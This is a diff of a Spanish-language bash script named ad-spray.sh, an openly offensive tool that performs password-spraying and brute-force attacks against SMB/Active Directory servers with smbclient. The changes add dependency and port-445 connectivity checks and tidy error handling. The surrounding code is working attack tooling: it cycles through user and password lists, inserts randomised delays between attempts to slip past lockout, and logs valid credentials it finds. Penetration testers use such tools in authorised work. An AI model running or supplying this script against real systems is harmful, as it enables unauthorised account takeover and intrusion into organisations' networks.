@@ -1,5 +1,6 @@
 #!/bin/bash
 # Autor: Federico Galarza
+# LinkedIn: linkedin.com/in/federico-galarza
 
 # Colores
 b="\e[1m"            # Texto bold
@@ -14,6 +15,8 @@ NF="\e[0m"           # Normal format
 # Variables globales
 SCRIPT_NAME="ad-spray.sh"
 VERSION=1.1
+COMMAND="smbclient"
+SMB_PORT="445"
 LOG_FILE=""
 SLEEP_SCALE=2 # Valor por defecto
 TOTAL_PASSWORDS=0
@@ -30,15 +33,14 @@ ${M}   Version: ${Y}$VERSION ${NF}
    Script bash que realiza ataques de password Sprying y de fuerza  
    bruta sobre servidores SMB, utilizando la herramienta smbclient. 
   ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
-    "
+  "
 }
 
 
-# Función de uso
+# Ayuda
 function usage() {
-    banner
-    echo -e "${Y}  [!]${NF} Uso: ${G}$SCRIPT_NAME${NF} -U [archivo_usuarios] -P [archivo_contraseñas] -s [servidor_SMB] -d [dominio] -t [tiempo_de_espera]"
-    echo -e "${B}  [i]${NF} Opciones:"
+    echo -e "${B}  [i]${NF} Modo de uso: ${G}$SCRIPT_NAME${NF} -U [archivo_usuarios] -P [archivo_contraseñas] -s [servidor_SMB]"
+    echo -e "${B}  [+]${NF} Opciones:"
     echo -e "      ${Y}-U${NF}    Archivo con la lista de usuarios (uno por línea)"
     echo -e "      ${Y}-u${NF}    Un único usuario"
     echo -e "      ${Y}-P${NF}    Archivo con la lista de contraseñas (una por línea)"
@@ -49,6 +51,34 @@ function usage() {
     echo -e "      ${Y}-h${NF}    Muestra la ayuda."
     exit 1
 }
+
+
+# Check si smbclient está instalado
+function smbclient_checker() {
+    if ! [ -x "$(command -v $COMMAND)" ]; then
+        {
+            banner
+            echo -e "\n${Y}  [!]${NF} Debe instalar ${G}$COMMAND${NF} para poder utilizar ${G}$SCRIPT_NAME ${NF}" 
+            echo -e "${B}  [i]${NF} Intente instalar con: \n"
+            echo -e "${R}     $(whoami 2>/dev/null)@$(hostname 2>/dev/null):${C}~${NF}$ sudo apt install $COMMAND"
+            exit 1
+        }
+    fi
+}
+
+
+# Comprobar conectividad
+function connect_checker() {
+    local host=$1
+    local port=$2
+
+    if ! timeout 1 bash 2>/dev/null -c "</dev/tcp/$host/$port " ; then 
+        banner
+        echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB${C} $host:$port ${NF}\n" 
+        exit 1
+    fi    
+}
+
 
 # Manejar CTRL+C
 trap ctrl_c INT
@@ -64,6 +94,7 @@ function ctrl_c() {
     tput cnorm
     exit 1
 }
+
 
 # Escribir en el log
 function write_log() {
@@ -92,6 +123,7 @@ function write_log() {
     esac
 }
 
+
 # Generar tiempo de espera aleatorio
 function random_sleep() {
     local min max
@@ -106,6 +138,7 @@ function random_sleep() {
     echo -e "${B}  [i]${NF} Esperando $sleep_time segundos antes de continuar... \n"
     sleep "$sleep_time"
 }
+
 
 # Función para rastrear estadísticas
 function track_stats() {
@@ -124,32 +157,38 @@ function track_stats() {
     esac
 }
 
+
 # Validar parámetros
 function validate_parameters() {
-    if [[ -z "$SERVER" || (-z "$USERS_FILE" && -z "$SINGLE_USER") ||
-          (-z "$PASSWORDS_FILE" && -z "$SINGLE_PASSWORD") ]]; then
-        echo -e "${Y}  [!]${NF} Error: Parámetros faltantes.\n"
+    if [[ -z "$SERVER" || (-z "$USERS_FILE" && -z "$SINGLE_USER") || (-z "$PASSWORDS_FILE" && -z "$SINGLE_PASSWORD") ]]; then
+        banner
+        echo -e "${Y}  [!]${NF} Error: Parámetros faltantes. \n"
         usage
     fi
 
     if [[ -n "$USERS_FILE" && -n "$SINGLE_USER" ]]; then
-        echo -e "${Y}  [!]${NF} Error: No se puede usar -U y -u al mismo tiempo.\n"
+        banner
+        echo -e "${Y}  [!]${NF} Error: No se puede usar -U y -u al mismo tiempo. \n"
         usage
     fi
     if [[ -n "$PASSWORDS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
-        echo -e "${Y}  [!]${NF} Error: No se puede usar -P y -p al mismo tiempo.\n"
+        banner
+        echo -e "${Y}  [!]${NF} Error: No se puede usar -P y -p al mismo tiempo. \n"
         usage
     fi
 
     if [[ -n "$USERS_FILE" && ! -f "$USERS_FILE" ]]; then
-        echo -e "${Y}  [!]${NF} Error: Archivo de usuarios no encontrado: $USERS_FILE\n"
+        banner
+        echo -e "${Y}  [!]${NF} Error: Archivo de usuarios no encontrado: $USERS_FILE"
         exit 1
     fi
     if [[ -n "$PASSWORDS_FILE" && ! -f "$PASSWORDS_FILE" ]]; then
-        echo -e "${Y}  [!]${NF} Error: Archivo de contraseñas no encontrado: $PASSWORDS_FILE\n"
+        banner
+        echo -e "${Y}  [!]${NF} Error: Archivo de contraseñas no encontrado: $PASSWORDS_FILE"
         exit 1
     fi
 }
+
 
 # Probar credenciales
 function test_credentials() {
@@ -163,7 +202,7 @@ function test_credentials() {
     # Ajustar el dominio si es "default"
     [[ "$domain" == "default" ]] && domain=""
 
-    if smbclient -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
+    if $COMMAND -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
         echo -e "${G}  [!]${NF} Credenciales válidas: $user:$password \n"
         write_log message "[!] Credenciales válidas: $user:$password"
         track_stats valid
@@ -174,11 +213,13 @@ function test_credentials() {
     fi
 }
 
+
 # Elimina los retorno de carro de archivos creados en Windows
 function normalize_files() {
     local file=$1
     sed -i 's/\r$//' "$file" 2>/dev/null
 }
+
 
 # Procesa una lista de usuarios y una lista de contraseñas
 function process_users_and_passwords() {
@@ -223,6 +264,7 @@ function process_single_user_and_passwords() {
     done < "$passwords_file"
 }
 
+
 # Procesa una lista de usuarios y una contraseña única
 function process_users_and_single_password() {
     local users_file=$1
@@ -242,6 +284,7 @@ function process_users_and_single_password() {
     done < "$users_file"
 }
 
+
 # Procesa un usuario único y una contraseña única
 function process_single_user_and_password() {
     local user=$1
@@ -255,6 +298,7 @@ function process_single_user_and_password() {
     test_credentials "$user" "$password" "$server" "$domain"
     random_sleep
 }
+
 
 # Procesar combinaciones
 function process_combination() {
@@ -291,12 +335,13 @@ function process_combination() {
         report_stats
         write_log fin
     else
-        echo -e "${Y}  [!]${NF} Error: Combinación de parámetros no válida."
         banner
+        echo -e "${Y}  [!]${NF} Error: Combinación de parámetros no válida."
         usage
         exit 1
     fi
 }
+
 
 # Reportar estadísticas
 function report_stats() {
@@ -315,7 +360,10 @@ function report_stats() {
 }
 
 
-# Main
+## Main
+
+# Check smbclient
+smbclient_checker
 
 # Parseo de parámetros
 while getopts "U:u:P:p:s:d:t:h" opt; do
@@ -327,8 +375,8 @@ while getopts "U:u:P:p:s:d:t:h" opt; do
         s) SERVER="$OPTARG" ;;
         d) DOMAIN="$OPTARG" ;;
         t) SLEEP_SCALE="$OPTARG" ;;
-        h) usage ;;
-        *) usage ;;
+        h) banner ; usage ;;
+        *) banner ; usage ;;
     esac
 done
 
@@ -337,4 +385,5 @@ DOMAIN=${DOMAIN:-"default"}
 LOG_FILE="spray_${DOMAIN}.log"
 
 validate_parameters
+connect_checker $SERVER $SMB_PORT
 process_combination
